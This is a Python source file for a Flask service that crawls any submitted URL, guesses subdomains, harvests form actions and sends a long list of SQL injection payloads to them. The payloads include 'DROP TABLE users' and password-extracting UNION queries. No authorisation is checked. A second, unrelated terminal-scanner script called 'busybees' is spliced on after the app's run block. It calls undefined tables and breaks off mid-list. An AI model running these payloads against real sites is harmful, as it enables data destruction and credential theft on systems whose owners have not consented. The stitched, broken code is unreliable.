from flask import Flask, request, send_file, jsonify
from flask_cors import CORS
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import mimetypes
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from datetime import datetime
import io
import sys
import argparse
import subprocess
import os
import time
import random
import threading
import re
import random
from urllib.parse import urlsplit


CURSOR_UP_ONE = '\x1b[1A' 
ERASE_LINE = '\x1b[2K'

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# List of predefined subdomains
PREDEFINED_SUBDOMAINS = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2","dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old", 
    "lists", "support", "mobile", "mx", "static", "docs", "beta", "shop", "sql", "secure", 
    "demo", "cp", "calendar", "wiki", "web", "media", "email", "images", "img", "www1", 
    "intranet", "portal", "video", "sip", "dns2", "api", "cdn", "stats", "dns1", "ns4", 
    "www3", "dns", "search", "staging", "server", "mx1", "chat", "wap", "my", "svn", "mail1", 
    "sites", "proxy", "ads", "host", "crm", "cms", "backup", "mx2", "lyncdiscover", "info", 
    "apps", "download", "remote", "db", "forums", "store", "relay", "files", "newsletter", 
    "app", "live", "owa", "en", "start", "sms", "office", "exchange", "ipv4", "mail3", 
    "help", "blogs", "helpdesk", "web1", "home", "library", "ftp2", "ntp", "monitor", 
    "login", "service", "correo", "www4", "moodle", "it", "gateway", "gw", "i", "stat", 
    "stage", "ldap", "tv", "ssl", "web2", "ns5", "upload", "nagios", "smtp2", "online", 
    "ad", "survey", "data", "radio", "extranet", "test2", "mssql", "dns3", "jobs", "services", 
    "panel", "irc", "hosting", "cloud", "de", "gmail", "s", "bbs", "cs", "ww", "mrtg", 
    "git", "image", "members", "poczta", "s1", "meet", "preview", "fr", "cloudflare-resolve-to", 
    "dev2", "photo", "jabber", "legacy", "go", "es", "ssh", "redmine", "partner", "vps", 
    "server1", "sv", "ns6", "webmail2", "av", "community", "cacti", "time", "sftp", "lib", 
    "facebook", "www5", "smtp1", "feeds", "w", "games", "ts", "alumni", "dl", "s2", "phpmyadmin", 
    "archive", "cn", "tools", "stream", "projects", "elearning", "im", "iphone", "control", 
    "voip", "test1", "ws", "rss", "sp", "wwww", "vpn2", "jira", "list", "connect", "gallery", 
    "billing", "mailer", "update", "pda", "game", "ns0", "testing", "sandbox", "job", 
    "events", "dialin", "ml", "fb", "videos", "music", "a", "partners", "mailhost", 
    "downloads", "reports", "ca", "router", "speedtest", "local", "training", "edu", 
    "bugs", "manage", "s3", "status", "host2", "ww2", "marketing", "conference", "content", 
    "network-ip", "broadcast-ip", "english", "catalog", "msoid", "mailadmin", "pay", "access", 
    "streaming", "project", "t", "sso", "alpha", "photos", "staff", "e", "auth", "v2", "web5", 
    "web3", "mail4", "devel", "post", "us", "images2", "master", "rt", "ftp1", "qa", "wp", 
    "dns4", "www6", "ru", "student", "w3", "citrix", "trac", "doc", "img2", "css", "mx3", 
    "adm", "web4", "hr", "mailserver", "travel", "sharepoint", "sport", "member", "bb", 
    "agenda", "link", "server2", "vod", "uk", "fw", "promo", "vip", "noc", "design", 
    "temp", "gate", "ns7", "file", "ms", "map", "cache", "painel", "js", "event", "mailing", 
    "db1", "c", "auto", "img1", "vpn1", "business", "mirror", "share", "cdn2", "site", 
    "maps", "tickets", "tracker", "domains", "club", "images1", "zimbra", "cvs", "b2b", 
    "oa", "intra", "zabbix", "ns8", "assets", "main", "spam", "lms", "social", "faq", 
    "feedback", "loopback", "groups", "m2", "cas", "loghost", "xml", "nl", "research", 
    "art", "munin", "dev1", "gis", "sales", "images3", "report", "google", "idp", "cisco", 
    "careers", "seo", "dc", "lab", "d", "firewall", "fs", "eng", "ann", "mail01", "mantis", 
    "v", "affiliates", "webconf", "track", "ticket", "pm", "db2", "b", "clients", "tech", 
    "erp", "monitoring", "cdn1", "images4", "payment", "origin", "client", "foto", "domain", 
    "pt", "pma", "directory", "cc", "public", "finance", "ns11", "test3", "wordpress", 
    "corp", "sslvpn", "cal", "mailman", "book", "ip", "zeus", "ns10", "hermes", "storage", 
    "free", "static1", "pbx", "banner", "mobil", "kb", "mail5", "direct", "ipfixe", "wifi", 
    "development", "board", "ns01", "st", "reviews", "radius", "pro", "atlas", "links", 
    "in", "oldmail", "register", "s4", "images6", "static2", "id", "shopping", "drupal", 
    "analytics", "m1", "images5", "images7", "img3", "mx01", "www7", "redirect", "sitebuilder", 
    "smtp3", "adserver", "net", "user", "forms", "outlook", "press", "vc", "health", 
    "work", "mb", "mm", "f", "pgsql", "jp", "sports", "preprod", "g", "p", "mdm", "ar", 
    "lync", "market", "dbadmin", "barracuda", "affiliate", "mars", "users", "images8", 
    "biblioteca", "mc", "ns12", "math", "ntp1", "web01", "software", "pr", "jupiter", 
    "labs", "linux", "sc", "love", "fax", "php", "lp", "tracking", "thumbs", "up", "tw", 
    "campus", "reg", "digital", "demo2", "da", "tr", "otrs", "web6", "ns02", "mailgw", 
    "education", "order", "piwik", "banners", "rs", "se", "venus", "internal", "webservices", 
    "cm", "whois", "sync", "lb", "is", "code", "click", "w2", "bugzilla", "virtual", 
    "origin-www", "top", "customer", "pub", "hotel", "openx", "log", "uat", "cdn3", "images0", 
    "cgi", "posta", "reseller", "soft", "movie", "mba", "n", "r", "developer", "nms", 
    "ns9", "webcam", "construtor", "ebook", "ftp3", "join", "dashboard", "bi", "wpad", 
    "admin2", "agent", "wm", "books", "joomla", "hotels", "ezproxy", "ds", "sa", "katalog", 
    "team", "emkt", "antispam", "adv", "mercury", "flash", "myadmin", "sklep", "newsite", 
    "law", "pl", "ntp2", "monitor", "login", "service", "correo", "www4", "moodle", "it"
]

# List of allowed file types
ALLOWED_FILE_TYPES = ["application/pdf", "text/html", "application/json"]

# List to store approved downloaded files
downloaded_files = []

# Function to check file MIME type
def check_file_type(file_url):
    file_type, _ = mimetypes.guess_type(file_url)
    return file_type

# Function to handle file download checking
def handle_file_download(url):
    file_type = check_file_type(url)
    if file_type not in ALLOWED_FILE_TYPES:
        return {"status": "unwanted", "file_url": url, "file_type": file_type}
    return {"status": "allowed", "file_url": url, "file_type": file_type}

# Function to scrape directories
def scrape_directories(url):
    links = set()
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if urlparse(full_url).netloc == urlparse(url).netloc:
                links.add(full_url)
    except requests.RequestException as e:
        print(f"Error scraping {url}: {e}")
    return links

# Function to check status of subdomains
def check_subdomain_status(base_url, subdomain):
    url = f"http://{subdomain}.{base_url}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return url
    except requests.RequestException:
        pass
    return None

# Function to find login/signup forms
def find_login_signup_forms(url):
    forms = []
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action')
            if action and any(keyword in action.lower() for keyword in ["login", "sign", "signin", "signup", "register", "auth", "authenticate", "user", "account", "password", "forgot", "reset", "username", "log", "log-in", "log-in-form", "sign-in", "sign-up","logon", "member", "new-user", "new-account", "create-account", "create-user", "signin-form","signup-form", "register-form", "join", "join-now", "access", "profile", "authentication",
    "create", "start", "get-started", "verify", "confirmation", "credentials", "login-submit",
    "signout", "logout", "exit", "login-btn", "signup-btn", "register-btn", "submit", "button",
    "submit-btn", "continue", "form", "form-container", "submit-form", "password-reset", "reset-form",
    "email", "email-address", "contact", "message", "send-message", "send", "contact-form",
    "get-in-touch", "enquiry", "inquiry", "feedback", "send-feedback", "question", "ask", "help",
    "support", "support-form", "helpdesk", "service", "request", "ticket", "contact-us", "reach-us",
    "phone", "phone-number", "fax", "address", "location", "post", "mail", "write", "form-field",
    "textbox", "textarea", "submit-button", "send-button", "action", "reply", "respond", "ask-question",
    "query", "lookup", "find", "search", "search-box", "search-form", "search-button", "find-results",
    "submit-search", "join-newsletter", "subscribe", "subscription", "subscribe-form", "sign-up-for-news",
    "join-us", "newsletter", "get-updates", "email-subscribe", "subscribe-now", "sign-up-now", "subscribe-btn",
    "email-updates", "get-notified", "newsletter-signup", "newsletter-subscribe", "opt-in", "email-opt-in",
    "unsubscribe", "unsubscribe-link", "update-preferences", "notification", "notifications", "sms",
    "phone-verification", "verify-phone", "otp", "pin", "code", "2fa", "two-factor", "security", "captcha",
    "recaptcha", "challenge", "image-challenge", "human-verification", "security-question", "answer", "hint",
    "hint-question", "confirmation-email", "verify-email", "link", "confirm", "continue-button", "verify-button",
    "proceed", "send-verification", "verify-now", "activate", "activation", "phone-auth", "email-auth",
    "multi-factor", "mfa", "multi-factor-auth", "send-otp", "get-code", "receive-code", "password-confirmation",
    "password-match", "re-enter-password", "confirm-password", "new-password", "old-password", "reset-password",
    "password-update", "change-password", "update-password", "password-strength", "strong-password", "weak-password",
    "security-check", "secure", "secure-auth", "trusted", "secure-login", "strong-auth", "access-code", "sign-up-here",
    "login-here", "log-in-here", "register-here", "create-account-here", "create-your-account", "make-an-account",
    "new-user-registration", "register-now", "complete-registration", "begin-registration", "registration-form",
    "form-control", "submit-registration", "accept", "agree", "consent", "terms", "accept-terms", "agree-terms",
    "terms-and-conditions", "privacy-policy", "confirm-terms", "captcha-check", "verify-you-are-human", "not-a-robot",
    "identity-verification", "personal-details", "profile-details", "basic-info", "user-info", "first-name",
    "last-name", "full-name", "birthdate", "dob", "age", "gender", "male", "female", "non-binary", "other",
    "email-verification", "verify-your-email", "validate-email", "address-details", "country", "state", "zip-code",
    "postal-code", "city", "phone-number", "mobile-number", "country-code", "area-code", "verify-mobile", "phone-auth",
    "mobile-verification", "identity", "social-login", "login-with-google", "login-with-facebook", "login-with-twitter",
    "social-signin", "social-authentication", "oauth", "authorize", "authorize-access", "allow-access", "grant-access",
    "request-permission", "login-via", "signin-via", "signup-via", "sign-up-via", "login-social", "forgot-password",
    "retrieve-password", "recover-password", "recover", "get-password", "send-reset-link", "password-reset-link",
    "reset-link", "generate-link", "confirm-link", "receive-reset-link", "sms-verification", "verify-sms", "phone-auth",
    "update-phone", "change-phone", "update-email", "change-email", "change-address", "save-changes", "apply-changes",
    "update-details", "edit-details", "edit-profile", "profile-update", "update-profile", "personal-info", "account-info",
    "form-submit", "input-field", "field", "radio-button", "checkbox", "dropdown", "select", "option", "submit-query",
    "form-submit-btn", "submit-request", "submit-feedback", "send-request", "send-query", "send-inquiry", "ask-us",
    "ask-question-now", "get-help", "submit-help", "get-support", "support-query", "help-query", "ask-support", 
    "form-response", "response", "message-us", "email-us", "reach-out", "form-send", "order-form", "booking-form", 
    "request-info", "appointment-form", "reservation-form", "booking", "appointment", "reservation", "submit-order", 
    "order-now", "order-submission", "make-a-booking", "reserve", "submit-reservation", "order", "place-order",
    "request-appointment", "schedule-appointment", "set-appointment", "schedule", "request-callback", "callback-form",
    "schedule-callback", "submit-callback", "file-upload", "file-upload-form", "submit-documents", "upload", "upload-file",
    "upload-doc", "send-file", "send-document", "attach", "attachment", "add-attachment", "send-attachment", 
    "browse-file", "choose-file", "select-file", "upload-photo", "upload-picture", "upload-image", "upload-application",
    "submit-application", "application-form", "apply-now", "job-application", "careers", "submit-cv", "upload-cv",
    "upload-resume", "resume-upload", "apply-online", "submit-job", "job-request", "apply-for-position", "apply-for-job",
    "submit-application", "job-form", "online-application", "submit-cv-form", "submit-resume-form", "apply-here", 
    "apply-today"]):
                forms.append(urljoin(url, action))
    except requests.RequestException as e:
        print(f"Error finding forms in {url}: {e}")
    return forms

# Function to perform SQL injection
def perform_sql_injection(url, form_action):
    payloads = [
        ("' OR '' = '", "Attempts to bypass authentication by injecting a condition that is always true."),
        ("' OR 1=1 --", "Classic SQL injection payload that often returns all records from the database."),
        ("'; DROP TABLE users --", "Payload that attempts to drop a database table."),
        ("' UNION SELECT password FROM users --", "Payload that attempts to retrieve passwords from the database."),
        ("'='", "This payload tries to trick the query into accepting the input as a valid condition."),
    ("'LIKE'", "Tests if the SQL query is vulnerable to a LIKE clause, often used in wildcards."),
    ("=0--+", "Attempts to bypass by terminating the query and adding a comment."),
    (" OR 1=1", "Classic SQL injection that always returns true, bypassing any logical checks."),
    ("' OR 'x'='x", "Bypasses authentication by injecting a condition that is always true."),
    ("' AND id IS NULL; --", "Attempts to exploit null conditions in the query logic."),
    ("'''''''''''''UNION SELECT '2", "Uses excessive quotes to attempt to bypass input sanitization."),
    ("%00", "Null byte injection, used to terminate strings prematurely in some databases."),
    ("/*…*/", "This payload uses SQL comments to bypass restrictions or manipulate logic."),
    ("+", "Tests for SQL concatenation vulnerabilities, often used in UNION or SELECT queries."),
    ("||", "Checks if the database supports string concatenation via the double-pipe operator."),
    ("%", "Tests for wildcard characters that might bypass query logic."),
    ("@variable", "Attempts to exploit SQL variables to manipulate the query."),
    ("@@variable", "Tests for vulnerabilities related to server-level variables."),
    ("AND 1", "Attempts to inject a true condition, testing for basic logical vulnerabilities."),
    ("AND 0", "Tests if false logical conditions are handled properly."),
    ("AND true", "Tries to inject a true boolean condition to manipulate the query."),
    ("AND false", "Attempts to break the logic by injecting a false condition."),
    ("1-false", "Tests for vulnerabilities by manipulating boolean values in the query."),
    ("1-true", "Tests if the query allows manipulation of boolean values."),
    ("1*56", "Attempts to manipulate mathematical operations in the query."),
    ("-2", "Injects a negative number to test for vulnerabilities in numeric fields."),
    ("1' ORDER BY 1--+", "Orders the results by the first column, which can reveal data structure."),
    ("1' ORDER BY 2--+", "Orders the results by the second column, probing for more information."),
    ("1' ORDER BY 3--+", "Continues to probe for available columns."),
    ("1' ORDER BY 1,2--+", "Orders by multiple columns to test for vulnerabilities."),
    ("1' ORDER BY 1,2,3--+", "Further tests column enumeration and query structure."),
    ("1' GROUP BY 1,2,--+", "Groups results by multiple columns to manipulate query logic."),
    ("1' GROUP BY 1,2,3--+", "Tests grouping vulnerabilities in the database query."),
    ("' GROUP BY columnnames having 1=1 --", "Attempts to exploit HAVING clauses for injection."),
    ("-1' UNION SELECT 1,2,3--+", "Union-based injection, attempting to select additional columns."),
    ("' UNION SELECT sum(columnname) from tablename --", "Tests for arithmetic operations in the SQL query."),
    ("-1 UNION SELECT 1 INTO @,@", "Attempts to insert results into user-defined variables."),
    ("-1 UNION SELECT 1 INTO @,@,@", "Similar to the previous, but with three variables."),
    ("1 AND (SELECT * FROM Users) = 1", "Injects a subquery to access sensitive data like user tables."),
    ("' AND MID(VERSION(),1,1) = '5';", "Probes for the version of the SQL database."),
    ("' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --", "Attempts to query database metadata."),
    (",(select * from (select(sleep(10)))a)", "Tests for time-based SQL injection (delaying response)."),
    ("%2c(select%20*%20from%20(select(sleep(10)))a)", "URL-encoded version of the sleep-based time delay injection."),
    ("';WAITFOR DELAY '0:0:30'--", "Time-delay attack to test if the query pauses for the specified time."),
    (" OR 1=1", "Classic boolean-based injection, making the query always true."),
    (" OR 1=0", "Tests the opposite scenario, making the query always false."),
    (" OR x=x", "Checks for identical comparisons to always return true."),
    (" OR x=y", "Checks if non-identical comparisons will throw errors or vulnerabilities."),
    (" OR 1=1#", "Comment-based bypass, ensuring the injected part is always true."),
    (" OR 1=0#", "Similar to the previous but tests for false logic."),
    (" OR x=x#", "Tests comment-based injections with boolean true logic."),
    (" OR x=y#", "Tests false boolean logic in comment-based injection."),
    (" OR 1=1--", "Tests injection by terminating the query and adding a comment."),
    (" OR 1=0--", "Tests for false condition injection with query termination."),
    (" OR x=x--", "Checks if identical conditions in the injection work as expected."),
    (" OR x=y--", "Tests non-identical conditions in comment-based injections."),
    (" OR 3409=3409 AND ('pytW' LIKE 'pytW'", "Checks for a true condition using the LIKE operator."),
    (" OR 3409=3409 AND ('pytW' LIKE 'pytY'", "Checks for a false condition using the LIKE operator."),
    ("HAVING 1=1", "Injects into HAVING clauses to bypass group filtering."),
    ("HAVING 1=0", "Injects into HAVING clauses with a false condition."),
    ("HAVING 1=1#", "Tests for comment-based injection within the HAVING clause."),
    ("HAVING 1=0#", "Tests false logic in comment-based HAVING injections."),
    ("HAVING 1=1--", "Injects true conditions in HAVING clauses and terminates the query."),
    ("HAVING 1=0--", "Injects false conditions in HAVING clauses and terminates the query."),
    ("AND 1=1", "Simple true condition to manipulate logic."),
    ("AND 1=0", "False condition to manipulate the logic flow."),
    ("AND 1=1--", "True condition injection with query termination."),
    ("AND 1=0--", "False condition injection with query termination."),
    ("AND 1=1#", "True condition injection with comment-based termination."),
    ("AND 1=0#", "False condition injection with comment-based termination."),
    ("AND 1=1 AND '%'='", "True condition injection using wildcards."),
    ("AND 1=0 AND '%'='", "False condition injection using wildcards."),
    ("AND 1083=1083 AND (1427=1427", "Tests for multiple true numeric conditions."),
    ("AND 7506=9091 AND (5913=5913", "Tests false and true conditions together."),
    ("AND 1083=1083 AND ('1427=1427", "Checks for vulnerabilities with string comparisons."),
    ("AND 7506=9091 AND ('5913=5913", "Tests for injection with a mix of false and true conditions."),
    ("AND 7300=7300 AND 'pKlZ'='pKlZ", "Tests string comparisons for always true conditions."),
    ("AND 7300=7300 AND 'pKlZ'='pKlY", "Tests string comparisons for always false conditions."),
    ("AS INJECTX WHERE 1=1 AND 1=1", "Tests true conditions in WHERE clauses."),
    ("AS INJECTX WHERE 1=1 AND 1=0", "Tests false conditions in WHERE clauses."),
    ("WHERE 1=1 AND 1=1--", "Tests WHERE clause injection with termination."),
    ("WHERE 1=1 AND 1=0--", "Tests false logic in WHERE clauses."),
    ("ORDER BY 1--", "Orders by the first column, probing for SQL injection points."),
    ("ORDER BY 2--", "Orders by the second column."),
    ("ORDER BY 31337#", "Tests for large numbers in ORDER BY clauses."),
    ("RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))", "Tests RLIKE condition for true."),
    ("IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--", "Tests for conditional logic within SQL."),
    ("%' AND 8310=8310 AND '%'='", "Tests for wildcard handling in SQL queries."),
    ("and (select substring(@@version,1,1))='X'", "Probes for the SQL version to understand the database.")
    ]

    vulnerabilities = []
    for payload, reason in payloads:
        test_url = f"{form_action}?test={payload}"
        try:
            response = requests.get(test_url)
            if "sql" in response.text.lower() or "error" in response.text.lower():
                vulnerabilities.append((payload, reason))
        except requests.RequestException:
            pass
    return (url, vulnerabilities) if vulnerabilities else (url, [])

# Function to generate the PDF report
def generate_report(vulnerabilities, main_domain_links, subdomain_links, stream):
    doc = SimpleDocTemplate(stream, pagesize=letter)
    story = []
    styles = getSampleStyleSheet()

    # Title
    title_style = styles['Title']
    story.append(Paragraph("Security Assessment Report", title_style))
    story.append(Spacer(1, 0.25 * inch))

    # Date
    date_style = styles['Normal']
    date_text = "Date of Assessment: " + str(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    story.append(Paragraph(date_text, date_style))
    story.append(Spacer(1, 0.25 * inch))

    # Vulnerabilities Found
    if vulnerabilities:
        heading_style = ParagraphStyle(name='Heading1', fontName='Helvetica-Bold', fontSize=14, spaceAfter=10)
        story.append(Paragraph("Vulnerabilities Found", heading_style))
        text_style = styles['Normal']
        for url, payloads in vulnerabilities:
            story.append(Paragraph(f"Possible SQL Injection vulnerability at {url}", text_style))
            for payload, reason in payloads:
                story.append(Paragraph(f"Payload: {payload}", text_style))
                story.append(Paragraph(f"Reason: {reason}", text_style))
                story.append(Paragraph("Remedies and Precautionary Measures:", text_style))
                story.append(Paragraph("- Validate and sanitize input parameters in SQL queries.", text_style))
                story.append(Paragraph("- Use parameterized queries to prevent injection attacks.", text_style))
                story.append(Spacer(1, 0.1 * inch))
            story.append(Spacer(1, 0.25 * inch))
    else:
        story.append(Paragraph("No vulnerabilities found", styles['Normal']))

    # Discovered Links for Main Domain
    heading_style = ParagraphStyle(name='Heading1', fontName='Helvetica-Bold', fontSize=14, spaceAfter=10)
    story.append(Paragraph("Main Domain Links", heading_style))
    text_style = styles['Normal']
    for link in main_domain_links:
        story.append(Paragraph(f'<a href="{link}" color="blue">{link}</a>', text_style))

    # Discovered Links for Subdomains
    story.append(Paragraph("Subdomain Links", heading_style))
    for subdomain, links in subdomain_links.items():
        story.append(Paragraph(f"Subdomain: {subdomain}", heading_style))
        for link in links:
            story.append(Paragraph(f'<a href="{link}" color="blue">{link}</a>', text_style))

    doc.build(story)

@app.route('/generate_report', methods=['POST'])
def generate_report_api():
    try:
        user_url = request.json.get('url')
        if not user_url:
            return jsonify({"error": "URL is required"}), 400

        # Scrape links for the main domain
        main_domain_links = scrape_directories(user_url)
        domain = urlparse(user_url).netloc
        subdomain_links = {}

        # Check each predefined subdomain
        for subdomain in PREDEFINED_SUBDOMAINS:
            status_url = check_subdomain_status(domain, subdomain)
            if status_url:
                subdomain_links[status_url] = scrape_directories(status_url)

        vulnerabilities = []

        # Perform SQL injection tests
        for link in main_domain_links:
            forms = find_login_signup_forms(link)
            for form in forms:
                vulnerability = perform_sql_injection(link, form)
                if vulnerability[1]:
                    vulnerabilities.append(vulnerability)

        pdf_stream = io.BytesIO()
        generate_report(vulnerabilities, main_domain_links, subdomain_links, pdf_stream)
        pdf_stream.seek(0)
        return send_file(pdf_stream, as_attachment=True, download_name='report.pdf', mimetype='application/pdf')

    except Exception as e:
        print(f"Error generating report: {e}")
        return jsonify({"error": "An error occurred while generating the report"}), 500

@app.route('/check_file_download', methods=['POST'])
def check_file_download():
    try:
        file_url = request.json.get('file_url')
        result = handle_file_download(file_url)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": "An error occurred while checking the file"}), 500

@app.route('/add_downloaded_file', methods=['POST'])
def add_downloaded_file():
    try:
        file_url = request.json.get('file_url')
        downloaded_files.append(file_url)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": "An error occurred while adding the file"}), 500

if __name__ == '__main__':
    app.run(debug=True)

# Scan Time Elapser
intervals = (
    ('h', 3600),
    ('m', 60),
    ('s', 1),
    )
def display_time(seconds, granularity=3):
    result = []
    seconds = seconds + 1
    for name, count in intervals:
        value = seconds // count
        if value:
            seconds -= value * count
            result.append("{}{}".format(value, name))
    return ' '.join(result[:granularity])


def terminal_size():
    try:
        rows, columns = subprocess.check_output(['stty', 'size']).split()
        return int(columns)
    except subprocess.CalledProcessError as e:
        return int(20)
    


def url_maker(url):
    if not re.match(r'http(s?)\:', url):
        url = 'http://' + url
    parsed = urlsplit(url)
    host = parsed.netloc
    if host.startswith('www.'):
        host = host[4:]
    return host

def check_internet():
    os.system('ping -c1 github.com > rs_net 2>&1')
    if "0% packet loss" in open('rs_net').read():
        val = 1
    else:
        val = 0
    os.system('rm rs_net > /dev/null 2>&1')
    return val


# Initializing the color module class
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    BADFAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    BG_ERR_TXT  = '\033[41m' # For critical errors and crashes
    BG_HEAD_TXT = '\033[100m'
    BG_ENDL_TXT = '\033[46m'
    BG_CRIT_TXT = '\033[45m'
    BG_HIGH_TXT = '\033[41m'
    BG_MED_TXT  = '\033[43m'
    BG_LOW_TXT  = '\033[44m'
    BG_INFO_TXT = '\033[42m'

    BG_SCAN_TXT_START = '\x1b[6;30;42m'
    BG_SCAN_TXT_END   = '\x1b[0m'


# Classifies the Vulnerability's Severity
def vul_info(val):
    result =''
    if val == 'c':
        result = bcolors.BG_CRIT_TXT+" critical "+bcolors.ENDC
    elif val == 'h':
        result = bcolors.BG_HIGH_TXT+" high "+bcolors.ENDC
    elif val == 'm':
        result = bcolors.BG_MED_TXT+" medium "+bcolors.ENDC
    elif val == 'l':
        result = bcolors.BG_LOW_TXT+" low "+bcolors.ENDC
    else:
        result = bcolors.BG_INFO_TXT+" info "+bcolors.ENDC
    return result

# Legends
proc_high = bcolors.BADFAIL + "●" + bcolors.ENDC
proc_med  = bcolors.WARNING + "●" + bcolors.ENDC
proc_low  = bcolors.OKGREEN + "●" + bcolors.ENDC

# Links the vulnerability with threat level and remediation database
def vul_remed_info(v1,v2,v3):
    print(bcolors.BOLD+"Vulnerability Threat Level"+bcolors.ENDC)
    print("\t"+vul_info(v2)+" "+bcolors.WARNING+str(tool_resp[v1][0])+bcolors.ENDC)
    print(bcolors.BOLD+"Vulnerability Definition"+bcolors.ENDC)
    print("\t"+bcolors.BADFAIL+str(tools_fix[v3-1][1])+bcolors.ENDC)
    print(bcolors.BOLD+"Vulnerability Remediation"+bcolors.ENDC)
    print("\t"+bcolors.OKGREEN+str(tools_fix[v3-1][2])+bcolors.ENDC)


# busybees Help Context
def helper():
        print(bcolors.OKBLUE+"Information:"+bcolors.ENDC)
        print("------------")
        print("\t./busybees.py example.com: Scans the domain example.com.")
        print("\t./busybees.py example.com --skip dmitry --skip theHarvester: Skip the 'dmitry' and 'theHarvester' tests.")
        print("\t./busybees.py example.com --nospinner: Disable the idle loader/spinner.")
        print("\t./busybees.py --update   : Updates the scanner to the latest version.")
        print("\t./busybees.py --help     : Displays this help context.")
        print(bcolors.OKBLUE+"Interactive:"+bcolors.ENDC)
        print("------------")
        print("\tCtrl+C: Skips current test.")
        print("\tCtrl+Z: Quits Busybees.")
        print(bcolors.OKBLUE+"Legends:"+bcolors.ENDC)
        print("--------")
        print("\t["+proc_high+"]: Scan process may take longer times (not predictable).")
        print("\t["+proc_med+"]: Scan process may take less than 10 minutes.")
        print("\t["+proc_low+"]: Scan process may take less than a minute or two.")
        print(bcolors.OKBLUE+"Vulnerability Information:"+bcolors.ENDC)
        print("--------------------------")
        print("\t"+vul_info('c')+": Requires immediate attention as it may lead to compromise or service unavailability.")
        print("\t"+vul_info('h')+"    : May not lead to an immediate compromise, but there are considerable chances for probability.")
        print("\t"+vul_info('m')+"  : Attacker may correlate multiple vulnerabilities of this type to launch a sophisticated attack.")
        print("\t"+vul_info('l')+"     : Not a serious issue, but it is recommended to tend to the finding.")
        print("\t"+vul_info('i')+"    : Not classified as a vulnerability, simply an useful informational alert to be considered.\n")


# Clears Line
def clear():
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K") #clears until EOL

# busybees Logo
def logo():
    print(bcolors.WARNING)
    logo_ascii = """"""
    print(logo_ascii)
    print(bcolors.ENDC)


# Initiliazing the idle loader/spinner class
class Spinner:
    busy = False
    delay = 0.005 # 0.05

    @staticmethod
    def spinning_cursor():
        while 1:
            #for cursor in '|/-\\/': yield cursor #←↑↓→
            #for cursor in '←↑↓→': yield cursor
            #for cursor in '....scanning...please..wait....': yield cursor
            for cursor in ' ': yield cursor
    def __init__(self, delay=None):
        self.spinner_generator = self.spinning_cursor()
        if delay and float(delay): self.delay = delay
        self.disabled = False

    def spinner_task(self):
        inc = 0
        try:
            while self.busy:
                if not self.disabled:
                    x = bcolors.BG_SCAN_TXT_START+next(self.spinner_generator)+bcolors.BG_SCAN_TXT_END
                    inc = inc + 1
                    print(x,end='')
                    if inc>random.uniform(0,terminal_size()): #30 init
                        print(end="\r")
                        bcolors.BG_SCAN_TXT_START = '\x1b[6;30;'+str(round(random.uniform(40,47)))+'m'
                        inc = 0
                    sys.stdout.flush()
                time.sleep(self.delay)
                if not self.disabled:
                    sys.stdout.flush()

        except (KeyboardInterrupt, ValueError, SystemExit):
            print("\n\t"+ bcolors.BG_ERR_TXT+"Busybees received a series of Ctrl+C hits. Quitting..." +bcolors.ENDC)
            sys.exit(1)

    def start(self):
        self.busy = True
        try:
            threading.Thread(target=self.spinner_task).start()
        except Exception as e:
            print("\n")
        
    def stop(self):
        try:
            self.busy = False
            time.sleep(self.delay)
        except (KeyboardInterrupt, ValueError, SystemExit):
            print("\n\t"+ bcolors.BG_ERR_TXT+"Busybees received a series of Ctrl+C hits. Quitting..." +bcolors.ENDC)
            sys.exit(1)

# End ofloader/spinner class

# Instantiating the spinner/loader class
spinner = Spinner()



# Scanners that will be used and filename rotation (default: enabled (1))
tool_names = [
                #1
                ["host","Host - Checks for existence of IPV6 address.","host",1],

                #2
                ["aspnet_config_err","ASP.Net Misconfiguration - Checks for ASP.Net Misconfiguration.","wget",1],

                #3
                ["wp_check","WordPress Checker - Checks for WordPress Installation.","wget",1],

                #4
                ["drp_check", "Drupal Checker - Checks for Drupal Installation.","wget",1],

                #5
                ["joom_check", "Joomla Checker - Checks for Joomla Installation.","wget",1],

                #6
                ["uniscan","Uniscan - Checks for robots.txt & sitemap.xml","uniscan",1],

                #7
                ["wafw00f","Wafw00f - Checks for Application Firewalls.","wafw00f",1],

                #8
                ["nmap","Nmap - Fast Scan [Only Few Port Checks]","nmap",1],

                #9
                ["theHarvester","The Harvester - Scans for emails using Google's passive search.","theHarvester",1],

                #10
                ["dnsrecon","DNSRecon - Attempts Multiple Zone Transfers on Nameservers.","dnsrecon",1],

                #11
                #["fierce","Fierce - Attempts Zone Transfer [No Brute Forcing]","fierce",1],

                #12
                ["dnswalk","DNSWalk - Attempts Zone Transfer.","dnswalk",1],

                #13
                ["whois","WHOis - Checks for Administrator's Contact Information.","whois",1],

                #14
                ["nmap_header","Nmap [XSS Filter Check] - Checks if XSS Protection Header is present.","nmap",1],

                #15
                ["nmap_sloris","Nmap [Slowloris DoS] - Checks for Slowloris Denial of Service Vulnerability.","nmap",1],

                #16
                ["sslyze_hbleed","SSLyze - Checks only for Heartbleed Vulnerability.","sslyze",1],

                #17
                ["nmap_hbleed","Nmap [Heartbleed] - Checks only for Heartbleed Vulnerability.","nmap",1],

                #18
                ["nmap_poodle","Nmap [POODLE] - Checks only for Poodle Vulnerability.","nmap",1],

                #19
